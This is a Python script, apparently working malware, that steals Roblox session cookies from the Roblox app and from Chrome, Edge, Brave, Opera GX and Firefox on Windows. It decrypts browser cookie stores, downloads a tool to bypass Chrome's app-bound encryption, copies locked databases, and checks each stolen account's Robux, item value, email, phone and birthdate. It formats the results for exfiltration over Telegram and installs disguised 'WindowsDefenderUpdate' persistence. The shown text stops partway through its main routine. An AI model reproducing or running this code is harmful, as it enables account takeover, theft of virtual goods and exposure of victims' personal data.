import asyncio
import re
import os
import io
import json
import base64
import shutil
import struct
import sqlite3
import ctypes
import binascii
import tempfile
import traceback
from pathlib import Path

try:
    from aiohttp import TCPConnector, ClientSession, ClientTimeout
    from aiohttp_socks import ProxyConnector
except ImportError:
    print("[!] Missing deps. Run: pip install aiohttp aiohttp_socks pywin32 cryptography pycryptodome")
    raise SystemExit

# -- Config ---------------------------------------------------------------

COOKIES_FILE = "cookies.txt"
THREADS      = 50
PROXY_FILE   = ""
TIMEOUT_SEC  = 15
DEBUG        = True

TG_BOT_TOKEN = "token here"
TG_CHAT_ID   = "chat id here"

# ── Debug helpers ─────────────────────────────────────────────────────────────

def dbg(section, msg):
    if DEBUG:
        print(f"  [dbg:{section}] {msg}")

def dbg_err(section, msg, exc=None):
    print(f"  [ERR:{section}] {msg}")
    if DEBUG and exc is not None:
        traceback.print_exc()

# ── Cookie patterns ───────────────────────────────────────────────────────────

COOKIE_START   = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
COOKIE_PATTERN = re.compile(
    r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\s]+'
)
MIN_100_PATTERN = re.compile(r'[A-Za-z0-9+/=._\-]{100,}')

# ── Roblox app extraction ─────────────────────────────────────────────────────

def extract_from_roblox_app() -> list:
    try:
        import win32crypt
        dbg("roblox-app", "win32crypt loaded OK")
    except ImportError:
        dbg_err("roblox-app", "win32crypt missing — run: pip install pywin32")
        return []

    paths = [
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Roblox",      "LocalStorage", "robloxcookies.dat"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), "RobloxPCGDK", "LocalStorage", "robloxcookies.dat"),
    ]

    found = []
    for dat_path in paths:
        dbg("roblox-app", f"Checking: {dat_path}")
        if not os.path.exists(dat_path):
            dbg("roblox-app", "  -> not found, skipping")
            continue
        dbg("roblox-app", "  -> file exists, reading...")
        try:
            with open(dat_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            dbg("roblox-app", f"  -> JSON parsed OK, keys: {list(data.keys())}")

            encoded = data.get("CookiesData", "")
            if not encoded:
                dbg_err("roblox-app", "  -> CookiesData key is missing or empty")
                continue

            dbg("roblox-app", f"  -> CookiesData length: {len(encoded)} chars")
            decoded   = base64.b64decode(encoded)
            dbg("roblox-app", f"  -> base64 decoded: {len(decoded)} bytes")

            decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
            dbg("roblox-app", f"  -> DPAPI decrypted: {len(decrypted)} bytes")

            content = decrypted.decode("utf-8", errors="ignore")
            dbg("roblox-app", f"  -> Content snippet: {repr(content[:80])}")

            match = re.search(r'\.ROBLOSECURITY[=\s]+([^\s;]+)', content)
            if match:
                cookie = match.group(1).rstrip(';')
                if not cookie.startswith("_|WARNING"):
                    cookie = f"{COOKIE_START}{cookie}"
                print(f"  [roblox-app] Cookie found in: {dat_path}")
                dbg("roblox-app", f"  -> Ends with: ...{cookie[-30:]}")
                found.append(cookie)
            else:
                dbg_err("roblox-app", "  -> Decrypted OK but .ROBLOSECURITY not found")
                dbg("roblox-app", f"  -> Full content: {repr(content)}")

        except json.JSONDecodeError as e:
            dbg_err("roblox-app", f"  -> JSON parse failed: {e}", e)
        except Exception as e:
            dbg_err("roblox-app", f"  -> Unexpected error: {e}", e)

    return found

# ── ChromElevator (v20 App-Bound bypass) ─────────────────────────────────────

CHROMELEVATOR_EXE      = "chromelevator.exe"
CHROMELEVATOR_BROWSERS = {"Chrome", "Edge", "Brave"}


def ensure_chromelevator() -> str | None:
    """Return path to chromelevator.exe, downloading it if needed."""
    # Store in %LOCALAPPDATA%\Microsoft\CLR_v4.0 — inconspicuous, deleted after use
    local_dir  = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'CLR_v4.0')
    os.makedirs(local_dir, exist_ok=True)
    local_path = os.path.join(local_dir, CHROMELEVATOR_EXE)
    if os.path.exists(local_path):
        dbg("chromelevator", f"Found existing binary: {local_path}")
        return local_path

    print(f"  [chromelevator] Not found locally, downloading from GitHub releases...")
    try:
        import urllib.request, zipfile, io, json as _json
        api_url = "https://api.github.com/repos/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest"
        req = urllib.request.Request(api_url, headers={"User-Agent": "cookie-checker"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            release_info = _json.loads(resp.read().decode())

        zip_url = None
        for asset in release_info.get("assets", []):
            if asset.get("name", "").lower().endswith(".zip"):
                zip_url = asset["browser_download_url"]
                dbg("chromelevator", f"Found zip: {asset['name']}")
                break

        if not zip_url:
            dbg_err("chromelevator", "No zip asset found in latest release")
            return None

        req2 = urllib.request.Request(zip_url, headers={"User-Agent": "cookie-checker"})
        with urllib.request.urlopen(req2, timeout=30) as resp:
            zip_data = resp.read()

        with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
            exe_name = None
            for name in zf.namelist():
                if "x64" in name.lower() and name.endswith(".exe"):
                    exe_name = name
                    break
            if not exe_name:
                for name in zf.namelist():
                    if name.endswith(".exe"):
                        exe_name = name
                        break
            if not exe_name:
                dbg_err("chromelevator", f"No .exe in zip: {zf.namelist()}")
                return None

            dbg("chromelevator", f"Extracting: {exe_name}")
            with zf.open(exe_name) as src, open(local_path, "wb") as dst:
                dst.write(src.read())

        print(f"  [chromelevator] Downloaded to: {local_path}")
        return local_path

    except Exception as e:
        dbg_err("chromelevator", f"Download failed: {e}", e)
        return None


def extract_via_chromelevator() -> list:
    """Run chromelevator.exe, parse JSON output, return .ROBLOSECURITY cookies."""
    import subprocess, tempfile, shutil as _sh

    exe = ensure_chromelevator()
    if not exe:
        dbg_err("chromelevator", "Binary not available — skipping")
        return []

    tmp_dir = tempfile.mkdtemp(prefix="chromelevator_out_")
    dbg("chromelevator", f"Output dir: {tmp_dir}")
    found = []

    try:
        def _run_cl(args, label):
            r = subprocess.run(
                args, capture_output=True, timeout=60, creationflags=0x08000000
            )
            dbg("chromelevator", f"{label} exit code: {r.returncode}")
            if r.stdout:
                for line in r.stdout.decode(errors="ignore").splitlines():
                    dbg("chromelevator", f"  stdout: {line}")
            if r.returncode != 0 and r.stderr:
                dbg_err("chromelevator", f"{label} stderr: {r.stderr.decode(errors='ignore')[:200]}")

        import time as _t

        def _run_cl_with_retry(browser, label, retries=2):
            """Run chromelevator for a browser, retrying if no cookies.json produced."""
            browser_out = os.path.join(tmp_dir, browser.capitalize())
            for attempt in range(1, retries + 1):
                _run_cl([exe, "--output-path", tmp_dir, browser], label)
                # Check if any profile folder with cookies.json was produced
                produced = any(
                    fname == "cookies.json"
                    for _, _, files in os.walk(browser_out)
                    for fname in files
                ) if os.path.exists(browser_out) else False
                if produced:
                    break
                if attempt < retries:
                    dbg("chromelevator", f"{label} produced no output — retrying ({attempt}/{retries-1})...")
                    _t.sleep(2)

        # Chrome
        _run_cl_with_retry("chrome", "chrome")

        # Brave
        _run_cl_with_retry("brave", "brave")

        # Edge
        _run_cl_with_retry("edge", "edge")

        # Parse JSON output
        for root, dirs, files in os.walk(tmp_dir):
            for fname in files:
                if fname != "cookies.json":
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as f:
                        cookies_json = json.loads(f.read().decode("utf-8", errors="replace"))
                    for entry in cookies_json:
                        if entry.get("name") == ".ROBLOSECURITY":
                            value = entry.get("value", "")
                            if value:
                                if not value.startswith("_|WARNING"):
                                    value = f"{COOKIE_START}{value}"
                                profile = os.path.relpath(root, tmp_dir)
                                print(f"  [chromelevator] Cookie found in: {profile}")
                                found.append(value)
                except Exception as e:
                    dbg_err("chromelevator", f"Failed to parse {fpath}: {e}", e)

    except subprocess.TimeoutExpired:
        dbg_err("chromelevator", "Timed out after 60s")
    except Exception as e:
        dbg_err("chromelevator", f"Failed to run: {e}", e)
    finally:
        try:
            _sh.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass
        try:
            if exe and os.path.exists(exe):
                os.unlink(exe)
                dbg("chromelevator", "Deleted chromelevator.exe")
        except Exception:
            pass

    return found


# ── Browser extraction (v10/v11) ──────────────────────────────────────────────

BROWSER_PROFILES = {
    "Chrome"  : os.path.join(os.getenv("LOCALAPPDATA", ""), "Google",        "Chrome",              "User Data"),
    "Edge"    : os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft",     "Edge",                "User Data"),
    "Brave"   : os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser",       "User Data"),
    "OperaGX" : os.path.join(os.getenv("APPDATA",      ""), "Opera Software","Opera GX Stable"),
}


def get_chrome_master_key(name: str, user_data_dir: str):
    local_state_path = os.path.join(user_data_dir, "Local State")
    dbg(name, f"Reading Local State: {local_state_path}")
    if not os.path.exists(local_state_path):
        dbg_err(name, "Local State not found")
        return None
    try:
        import win32crypt
    except ImportError:
        dbg_err(name, "win32crypt missing — run: pip install pywin32")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc_key_b64 = ls.get("os_crypt", {}).get("encrypted_key")
        if not enc_key_b64:
            dbg_err(name, "os_crypt.encrypted_key not found in Local State")
            return None
        enc_key = base64.b64decode(enc_key_b64)
        dbg(name, f"  -> encrypted_key: {len(enc_key)} bytes, prefix: {enc_key[:5]}")
        enc_key    = enc_key[5:]  # strip DPAPI marker
        master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        dbg(name, f"  -> master key: {len(master_key)} bytes")
        return master_key
    except Exception as e:
        dbg_err(name, f"Failed to get master key: {e}", e)
        return None


def decrypt_chrome_cookie(name: str, ev: bytes, master_key: bytes):
    if not ev:
        return None
    prefix = ev[:3]
    dbg(name, f"  -> prefix: {prefix}, length: {len(ev)}")

    if prefix == b'v20':
        return None  # handled by ChromElevator

    if prefix not in (b'v10', b'v11'):
        dbg_err(name, f"  -> Unknown prefix: {prefix}")
        return None

    nonce = ev[3:15]
    ct    = ev[15:]

    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        dec = AESGCM(master_key).decrypt(nonce, ct, None)
        # Strip 32-byte random prefix Chrome/Chromium prepends to plaintext
        result = dec[32:].decode("utf-8", errors="ignore") if len(dec) > 32 else dec.decode("utf-8", errors="ignore")
        dbg(name, "  -> Decrypted with cryptography")
        return result if result else None
    except ImportError:
        dbg(name, "  -> cryptography not installed, trying pycryptodome...")
    except Exception as e:
        dbg_err(name, f"  -> cryptography failed: {e}", e)

    try:
        from Crypto.Cipher import AES
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        dec = cipher.decrypt_and_verify(ev[15:-16], ev[-16:])
        # Strip 32-byte random prefix
        result = dec[32:].decode("utf-8", errors="ignore") if len(dec) > 32 else dec.decode("utf-8", errors="ignore")
        dbg(name, "  -> Decrypted with pycryptodome")
        return result if result else None
    except ImportError:
        dbg_err(name, "  -> pycryptodome not installed. Run: pip install cryptography")
    except Exception as e:
        dbg_err(name, f"  -> pycryptodome failed: {e}", e)

    return None


def get_chrome_profiles(name: str, user_data_dir: str) -> list:
    profiles = []
    for pname in ["Default"] + [f"Profile {i}" for i in range(1, 20)]:
        p = os.path.join(user_data_dir, pname)
        if os.path.isdir(p):
            dbg(name, f"  -> Found profile: {pname}")
            profiles.append(p)
    return profiles


def extract_from_chromium_browser(name: str, user_data_dir: str) -> list:
    dbg(name, f"Checking: {user_data_dir}")
    if not os.path.isdir(user_data_dir):
        dbg(name, "  -> Not found, skipping")
        return []

    master_key = get_chrome_master_key(name, user_data_dir)
    if not master_key:
        dbg_err(name, "No master key — skipping v10/v11")

    found    = []
    profiles = get_chrome_profiles(name, user_data_dir)

    for profile_dir in profiles:
        pname  = os.path.basename(profile_dir)
        db_path = None
        for sub in [os.path.join("Network", "Cookies"), "Cookies"]:
            candidate = os.path.join(profile_dir, sub)
            if os.path.exists(candidate):
                db_path = candidate
                dbg(name, f"  -> Cookie DB: {candidate}")
                break

        if not db_path:
            dbg(name, f"  -> No cookie DB in profile: {pname}")
            continue



        # ── v10/v11 via master key ────────────────────────────────────────────
        if master_key:
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            tmp.close()
            copied = False

            # Method 1: normal copy (works when browser is closed)
            try:
                shutil.copy2(db_path, tmp.name)
                if os.path.getsize(tmp.name) > 0:
                    copied = True
                    dbg(name, f"  -> DB copied normally ({os.path.getsize(tmp.name)} bytes)")
            except Exception:
                pass

            # Method 2: CopyFileW — proper Win32 copy that handles open file locks
            if not copied:
                dbg(name, "  -> File locked, trying CopyFileW...")
                ret = ctypes.windll.kernel32.CopyFileW(db_path, tmp.name, False)
                if ret and os.path.getsize(tmp.name) > 0:
                    copied = True
                    dbg(name, f"  -> DB copied via CopyFileW ({os.path.getsize(tmp.name)} bytes)")
                else:
                    err = ctypes.windll.kernel32.GetLastError()
                    dbg(name, f"  -> CopyFileW failed (error {err})")

            # Method 3: esentutl — Windows built-in tool for copying locked DB files
            if not copied:
                dbg(name, "  -> Trying esentutl...")
                import subprocess as _sp
                _r = _sp.run(
                    ["esentutl", "/y", db_path, "/d", tmp.name, "/o"],
                    capture_output=True, creationflags=0x08000000
                )
                if _r.returncode == 0 and os.path.exists(tmp.name) and os.path.getsize(tmp.name) > 0:
                    copied = True
                    dbg(name, f"  -> DB copied via esentutl ({os.path.getsize(tmp.name)} bytes)")
                else:
                    dbg_err(name, "  -> All copy methods failed")

            # Copy WAL and SHM files if they exist (needed when DB is in WAL journal mode)
            for ext in ("-wal", "-shm"):
                wal_src = db_path + ext
                wal_dst = tmp.name + ext
                dbg(name, f"  -> WAL check: {wal_src} exists={os.path.exists(wal_src)}")
                if os.path.exists(wal_src):
                    try:
                        shutil.copy2(wal_src, wal_dst)
                        dbg(name, f"  -> Copied {ext} file")
                    except Exception:
                        try:
                            GENERIC_READ   = 0x80000000
                            FILE_SHARE_ALL = 0x07
                            OPEN_EXISTING  = 3
                            h2 = ctypes.windll.kernel32.CreateFileW(
                                wal_src, GENERIC_READ, FILE_SHARE_ALL,
                                None, OPEN_EXISTING, 0, None
                            )
                            INVALID_HANDLE = ctypes.c_void_p(-1).value
                            if h2 and h2 != INVALID_HANDLE:
                                buf2  = ctypes.create_string_buffer(65536)
                                done2 = ctypes.c_ulong(0)
                                with open(wal_dst, "wb") as out2:
                                    while True:
                                        ok2 = ctypes.windll.kernel32.ReadFile(
                                            h2, buf2, len(buf2), ctypes.byref(done2), None
                                        )
                                        if not ok2 or done2.value == 0:
                                            break
                                        out2.write(buf2.raw[:done2.value])
                                ctypes.windll.kernel32.CloseHandle(h2)
                                dbg(name, f"  -> Copied {ext} via CreateFile")
                        except Exception:
                            pass

            wal_present = os.path.exists(tmp.name + "-wal")
            if copied:
                try:
                    # Try temp copy first; if table missing, fall back to direct read
                    uri = f"file:{tmp.name}" if wal_present else f"file:{tmp.name}?immutable=1"
                    con = sqlite3.connect(uri, uri=True)
                    # Quick check — if cookies table missing, close and try direct path
                    tbls = con.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
                    tbl_names = [t[0] for t in tbls]
                    dbg(name, f"  -> Tables in copy: {tbl_names}")
                    if "cookies" not in tbl_names:
                        con.close()
                        dbg(name, "  -> Cookies table missing from copy, trying direct URI open...")
                        direct_uri = f"file:{db_path.replace(chr(92), '%5C')}?mode=ro&nolock=1"
                        con = sqlite3.connect(direct_uri, uri=True)
                    con.row_factory = sqlite3.Row
                    cur = con.cursor()
                    cur.execute(
                        "SELECT name, encrypted_value FROM cookies "
                        "WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
                    )
                    rows = cur.fetchall()
                    dbg(name, f"  -> {len(rows)} .ROBLOSECURITY row(s) in {pname}")
                    for row in rows:
                        ev    = row["encrypted_value"]
                        value = decrypt_chrome_cookie(name, ev, master_key)
                        if value:
                            if not value.startswith("_|WARNING"):
                                value = f"{COOKIE_START}{value}"
                            print(f"  [{name}] v10/v11 cookie found in profile: {pname}")
                            found.append(value)
                    con.close()
                except sqlite3.OperationalError as e:
                    dbg_err(name, f"  -> SQLite error: {e}", e)
                except Exception as e:
                    dbg_err(name, f"  -> Error reading {pname}: {e}", e)
            try:
                os.unlink(tmp.name)
            except Exception:
                pass

        # v20 cookies handled by ChromElevator — skipped here

    return found


def extract_from_firefox() -> list:
    firefox_dir = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    dbg("firefox", f"Checking: {firefox_dir}")
    if not os.path.isdir(firefox_dir):
        dbg("firefox", "  -> Not installed, skipping")
        return []

    found = []
    for profile in Path(firefox_dir).iterdir():
        if not profile.is_dir():
            continue
        cookie_db = profile / "cookies.sqlite"
        dbg("firefox", f"  -> Checking profile: {profile.name}")
        if not cookie_db.exists():
            dbg("firefox", "    -> cookies.sqlite not found")
            continue

        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
        tmp.close()
        try:
            shutil.copy2(str(cookie_db), tmp.name)
            con = sqlite3.connect(tmp.name)
            cur = con.cursor()
            cur.execute(
                "SELECT value FROM moz_cookies "
                "WHERE host LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
            )
            rows = cur.fetchall()
            dbg("firefox", f"    -> {len(rows)} row(s) in {profile.name}")
            for row in rows:
                value = row[0]
                if value:
                    if not value.startswith("_|WARNING"):
                        value = f"{COOKIE_START}{value}"
                    print(f"  [firefox] Cookie found in profile: {profile.name}")
                    found.append(value)
            con.close()
        except sqlite3.OperationalError as e:
            dbg_err("firefox", f"    -> SQLite error: {e}", e)
        except Exception as e:
            dbg_err("firefox", f"    -> Error in {profile.name}: {e}", e)
        finally:
            try:
                os.unlink(tmp.name)
            except Exception:
                pass

    return found

# ── File fallback ─────────────────────────────────────────────────────────────

def load_cookies_from_file(path: str) -> list:
    cookies = set()
    dbg("file", f"Checking: {path}")
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                m = COOKIE_PATTERN.search(line)
                if m:
                    cookies.add(m.group(0))
                    continue
                m = MIN_100_PATTERN.search(line)
                if m:
                    cookies.add(f"{COOKIE_START}{m.group(0)}")
        dbg("file", f"  -> {len(cookies)} cookie(s) found")
    except FileNotFoundError:
        dbg("file", "  -> File not found")
    return list(cookies)

# ── Proxy loader ──────────────────────────────────────────────────────────────

def load_proxies(path: str) -> list:
    if not path:
        return []
    proxies  = []
    proxy_re = re.compile(
        r'(?:(https?|socks[45])://)?(?:([^:@\s]+):([^:@\s]+)@)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})'
    )
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                m = proxy_re.search(line.strip())
                if m:
                    proto = m.group(1) or "http"
                    if m.group(2) and m.group(3):
                        proxies.append(f"{proto}://{m.group(2)}:{m.group(3)}@{m.group(4)}:{m.group(5)}")
                    else:
                        proxies.append(f"{proto}://{m.group(4)}:{m.group(5)}")
        dbg("proxy", f"Loaded {len(proxies)} proxy/proxies")
    except FileNotFoundError:
        dbg_err("proxy", f"Proxy file not found: {path}")
    return proxies

# ── HTTP helpers ──────────────────────────────────────────────────────────────

def get_connector(proxies):
    if proxies:
        import random
        return ProxyConnector.from_url(random.choice(proxies))
    return TCPConnector(limit=0)


async def safe_get(session, url):
    try:
        async with session.get(url) as r:
            if r.status == 200:
                return await r.json()
            dbg("api", f"Non-200 from {url} -> {r.status}")
    except Exception as e:
        dbg("api", f"Request failed {url} -> {e}")
    return None

# ── Core checker ──────────────────────────────────────────────────────────────

async def check_cookie(cookie: str, proxies: list, timeout: int) -> dict:
    short = cookie[-20:]
    try:
        connector = get_connector(proxies)
        async with ClientSession(
            connector=connector,
            timeout=ClientTimeout(total=timeout),
            cookies={".ROBLOSECURITY": cookie}
        ) as session:

            dbg("check", f"[...{short}] Authenticating...")
            async with session.get("https://users.roblox.com/v1/users/authenticated") as resp:
                dbg("check", f"[...{short}] Auth response: {resp.status}")
                if resp.status == 401:
                    return {"status": "invalid", "cookie": cookie}
                if resp.status == 403:
                    return {"status": "banned", "cookie": cookie}
                if resp.status != 200:
                    return {"status": "error", "cookie": cookie, "code": resp.status}
                auth = await resp.json()

            uid      = auth.get("id")
            username = auth.get("name", "?")
            dispname = auth.get("displayName", username)
            dbg("check", f"[...{short}] Authenticated as {username} (ID: {uid})")

            (
                robux_data, billing_data, premium_data, profile_data,
                contact_data, phone_data, pin_data,
                groups_data, friends_data, followers_data, followings_data,
                age_data, voice_data, rap_data,
            ) = await asyncio.gather(
                safe_get(session, f"https://economy.roblox.com/v1/users/{uid}/currency"),
                safe_get(session, f"https://economy.roblox.com/v1/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary"),
                safe_get(session, f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership"),
                safe_get(session, f"https://users.roblox.com/v1/users/{uid}"),
                safe_get(session, "https://accountinformation.roblox.com/v1/email"),
                safe_get(session, "https://accountinformation.roblox.com/v1/phone"),
                safe_get(session, "https://auth.roblox.com/v1/account/pin"),
                safe_get(session, f"https://groups.roblox.com/v1/users/{uid}/groups/roles"),
                safe_get(session, f"https://friends.roblox.com/v1/users/{uid}/friends/count"),
                safe_get(session, f"https://friends.roblox.com/v1/users/{uid}/followers/count"),
                safe_get(session, f"https://friends.roblox.com/v1/users/{uid}/followings/count"),
                safe_get(session, "https://accountinformation.roblox.com/v1/birthdate"),
                safe_get(session, "https://voice.roblox.com/v1/settings"),
                safe_get(session, f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Asc"),
            )

            robux      = robux_data.get("robux")                if robux_data    else None
            pending    = billing_data.get("pendingRobuxTotal")  if billing_data  else None
            earned_yr  = billing_data.get("incomingRobuxTotal") if billing_data  else None
            premium    = bool(premium_data)                     if premium_data is not None else None
            desc       = (profile_data.get("description") or "")[:100].replace("\n", " ") if profile_data else ""
            created    = (profile_data.get("created") or "")[:10]                          if profile_data else ""
            email_ver  = contact_data.get("verified")           if contact_data  else None
            phone_ver  = phone_data.get("isVerified")           if phone_data    else None
            pin_on     = pin_data.get("isEnabled")              if pin_data      else None
            group_count   = len(groups_data.get("data", []))    if groups_data    else None
            friends_ct    = friends_data.get("count")            if friends_data   else None
            followers_ct  = followers_data.get("count")          if followers_data else None
            followings_ct = followings_data.get("count")         if followings_data else None

            dob = None
            if age_data:
                y, mo, d = age_data.get("birthYear"), age_data.get("birthMonth"), age_data.get("birthDay")
                if y:
                    dob = f"{d:02d}/{mo:02d}/{y}" if (d and mo) else str(y)

            voice_on = None
            if voice_data:
                voice_on = voice_data.get("isVoiceEnabled") or voice_data.get("isUserOptIn")

            rap = None
            if rap_data:
                items = rap_data.get("data") or []
                rap   = sum(i.get("recentAveragePrice") or 0 for i in items)

            dbg("check", f"[...{short}] Done — Robux={robux}, RAP={rap}, Premium={premium}")

            return {
                "status"     : "valid",
                "cookie"     : cookie,
                "user_id"    : uid,
                "username"   : username,
                "disp_name"  : dispname,
                "created"    : created,
                "description": desc,
                "robux"      : robux,
                "pending"    : pending,
                "earned_yr"  : earned_yr,
                "premium"    : premium,
                "email"      : email_ver,
                "phone"      : phone_ver,
                "pin"        : pin_on,
                "groups"     : group_count,
                "friends"    : friends_ct,
                "followers"  : followers_ct,
                "followings" : followings_ct,
                "rap"        : rap,
                "dob"        : dob,
                "voice"      : voice_on,
            }

    except asyncio.TimeoutError:
        dbg_err("check", f"[...{short}] Timed out after {timeout}s")
        return {"status": "error", "cookie": cookie, "error": f"Timed out after {timeout}s"}
    except Exception as e:
        dbg_err("check", f"[...{short}] Unexpected error: {e}", e)
        return {"status": "error", "cookie": cookie, "error": str(e)}

# ── Formatting ────────────────────────────────────────────────────────────────


def yn(v):  return "?" if v is None else ("Yes" if v else "No")
def fmt(v): return "?" if v is None else str(v)

def format_valid(r: dict) -> str:
    """Plain text version for console."""
    return "\n".join([
        "-" * 62,
        f"Username  : {r['username']} ({r['disp_name']})  |  ID: {r['user_id']}",
        f"Profile   : https://www.roblox.com/users/{r['user_id']}/profile",
        f"Created   : {r['created']}  |  DOB: {fmt(r['dob'])}",
        f"Robux     : {fmt(r['robux'])}  |  Pending: {fmt(r['pending'])}  |  Earned/yr: {fmt(r['earned_yr'])}",
        f"RAP       : {fmt(r['rap'])}  |  Premium: {yn(r['premium'])}",
        f"Email     : {yn(r['email'])}  |  Phone: {yn(r['phone'])}  |  PIN: {yn(r['pin'])}",
        f"Friends   : {fmt(r['friends'])}  |  Followers: {fmt(r['followers'])}  |  Following: {fmt(r['followings'])}",
        f"Groups    : {fmt(r['groups'])}  |  Voice: {yn(r['voice'])}",
        f"Desc      : {r['description'] or '(none)'}",
        f"Cookie    : {r['cookie']}",
        "",
    ])


def format_telegram(r: dict) -> str:
    """HTML-formatted Telegram message for a valid cookie."""
    return (
        f"<b>Valid Cookie Found</b>\n\n"
        f"<b>Username</b>: <a href=\"https://www.roblox.com/users/{r['user_id']}/profile\">{r['username']}</a>"
        f" ({r['disp_name']}) | ID: <code>{r['user_id']}</code>\n"
        f"<b>Created</b>: {r['created']}  |  DOB: {fmt(r['dob'])}\n\n"
        f"<b>Robux</b>: {fmt(r['robux'])}\n"
        f"<b>Pending</b>: {fmt(r['pending'])}\n"
        f"<b>Earned (Year)</b>: {fmt(r['earned_yr'])}\n"
        f"<b>RAP</b>: {fmt(r['rap'])}\n"
        f"<b>Premium</b>: {yn(r['premium'])}\n\n"
        f"<b>Email</b>: {yn(r['email'])}  |  <b>Phone</b>: {yn(r['phone'])}  |  <b>PIN</b>: {yn(r['pin'])}\n"
        f"<b>Friends</b>: {fmt(r['friends'])}  |  <b>Followers</b>: {fmt(r['followers'])}  |  <b>Following</b>: {fmt(r['followings'])}\n"
        f"<b>Groups</b>: {fmt(r['groups'])}  |  <b>Voice</b>: {yn(r['voice'])}\n\n"
        f"<b>Description</b>: {r['description'] or '(none)'}\n\n"
        f"<b>Cookie</b>:\n<code>{r['cookie']}</code>"
    )


def console_summary(r: dict) -> str:
    return (
        f"  [+] {r['username']} | "
        f"Robux: {fmt(r['robux'])} | RAP: {fmt(r['rap'])} | "
        f"Premium: {yn(r['premium'])} | "
        f"Email: {yn(r['email'])} | Friends: {fmt(r['friends'])}"
    )


async def send_telegram(session: ClientSession, text: str) -> bool:
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    try:
        async with session.post(url, json={
            "chat_id"   : TG_CHAT_ID,
            "text"      : text,
            "parse_mode": "HTML"
        }) as resp:
            if resp.status == 200:
                return True
            body = await resp.text()
            dbg_err("telegram", f"Send failed ({resp.status}): {body}")
            return False
    except Exception as e:
        dbg_err("telegram", f"Request error: {e}", e)
        return False


# ── Logging ───────────────────────────────────────────────────────────────────

def write_log(message: str) -> None:
    """Append a timestamped line to run.log in the script directory."""
    import datetime
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "run.log")
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception:
        pass


# ── Persistence ───────────────────────────────────────────────────────────────

def add_to_all_startups() -> None:
    """Install persistence via HKCU RunOnce only."""
    import sys, winreg, shutil as _sh

    app_name    = "WindowsDefenderUpdate"
    persist_dir = os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "CLR_v4.0")
    os.makedirs(persist_dir, exist_ok=True)

    # Check if argv[0] is an exe (compiled) or a .py script
    argv0 = os.path.abspath(sys.argv[0])
    dbg("startup", f"argv[0] = {argv0}")
    dbg("startup", f"sys.executable = {sys.executable}")

    if argv0.lower().endswith(".exe"):
        # Running as compiled exe — copy to permanent location
        dest_exe = os.path.join(persist_dir, "WinDefUpdate.exe")
        try:
            if not os.path.exists(dest_exe) or os.path.getsize(dest_exe) != os.path.getsize(argv0):
                _sh.copy2(argv0, dest_exe)
                dbg("startup", f"Copied exe to: {dest_exe}")
            else:
                dbg("startup", f"Exe already up to date at: {dest_exe}")
        except Exception as e:
            dbg_err("startup", f"Failed to copy exe: {e}")
            dest_exe = argv0
        cmd = f'"{dest_exe}"'
    else:
        # Running as .py script
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        script = os.path.abspath(__file__)
        cmd = f'"{pythonw}" "{script}"'

    app_name = "WindowsDefenderUpdate"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        write_log("Persistence installed via: HKCU\\RunOnce")
        dbg("startup", "Registered in HKCU\\RunOnce")
    except Exception as e:
        dbg_err("startup", f"HKCU RunOnce failed: {e}")

async def main():
    import sys, platform
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    write_log(f"Started | user={os.getenv('USERNAME','?')} | admin={is_admin} | host={platform.node()} | python={sys.executable}")
    add_to_all_startups()
    import time; time.sleep(2)  # wait for network + browsers after login
    print("[~] Scanning for Roblox cookies...\n")
    print(f"  [dbg] DEBUG={DEBUG} | Admin={is_admin} (admin required for v20)\n")

    all_cookies = []

    print("[~] Checking Roblox app...")
    c = extract_from_roblox_app()
    all_cookies.extend(c)
    print(f"  -> {len(c)} cookie(s) found\n")

    # ChromElevator handles v20 app-bound encryption for Chrome/Brave/Edge
    print("[~] Checking browsers via ChromElevator (v20 bypass)...")
    c = extract_via_chromelevator()
